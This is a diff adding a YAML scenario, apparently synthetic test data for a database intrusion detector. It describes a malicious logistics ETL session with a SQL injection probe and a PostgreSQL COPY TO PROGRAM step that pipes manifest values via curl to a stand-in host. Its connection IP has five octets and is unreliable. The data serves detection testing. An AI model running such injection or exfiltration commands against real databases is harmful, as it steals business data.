@@ -1,0 +1,33 @@
+scenario_id: gen_logistics_69_sql_injection_mal_1865m
+family_id: gen_logistics_69_sql_injection_fam_1865
+domain: logistics
+time_of_day: '23:35'
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: inject
+  role: partner_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 5.0
+  events:
+  - step_id: probe
+    sql: SELECT shipment_id, status FROM shipments WHERE shipment_id = 104609 AND
+      (SELECT count(*) FROM manifests) > 0
+  - step_id: exfil
+    sql: COPY (SELECT declared_value FROM manifests) TO PROGRAM 'curl -sX POST https://sync.partner-mirror.example/ingest
+      -d @-'
+    connects_to:
+      ip: 23.129.64.143.147
+      port: 443
+matched_pair_id: gen_logistics_69_sql_injection_pair_1865
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
